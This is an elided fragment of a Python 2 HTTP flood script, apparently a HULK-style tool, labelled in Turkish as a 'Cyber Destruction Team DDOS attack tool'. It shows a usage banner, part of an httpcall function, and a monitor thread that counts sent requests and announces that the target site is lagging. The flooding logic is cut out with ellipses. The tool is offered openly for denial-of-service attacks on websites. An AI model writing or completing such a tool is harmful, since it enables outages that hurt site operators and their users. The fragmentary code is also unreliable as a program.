...
def usage():
	print '---------------------------------------------------'
	print 'SİBER İMHA EKİBİ DDOS ATTACK TOOL'
	print 'ARAÇ BAŞARIYLA KURULDU İYİ KULLANIMLAR '
	print '---------------------------------------------------'
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print 'DDOS PAKETLERİ BAŞARIYLA GÖNDERİLDİ!'
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Paketler Gönderildi" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- SİTE KASIYOR... '-' --"
